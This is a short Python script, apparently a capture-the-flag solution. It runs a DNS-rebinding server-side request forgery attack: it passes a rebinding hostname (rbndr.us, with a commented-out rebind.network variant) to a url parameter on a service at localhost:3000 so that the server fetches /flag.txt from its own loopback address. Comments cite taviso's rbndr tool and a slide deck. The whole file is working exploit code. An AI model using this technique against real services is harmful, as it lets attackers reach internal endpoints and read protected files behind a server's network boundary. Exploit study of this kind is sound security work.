#! /usr/bin/python3
# https://github.com/taviso/rbndr/blob/master/rebinder.html
# https://hackmd.io/@foxo-tw/Sy57iBSsH?print-pdf#/p13

import requests

#res = requests.get('http://localhost:3000/?url=http://a.87.87.87.87.1time.127.0.0.1.1times.repeat.asdf.rebind.network/flag.txt');
res = requests.get('http://localhost:3000/?url=http://7f000001.57575757.rbndr.us/flag.txt');
print(res.text)
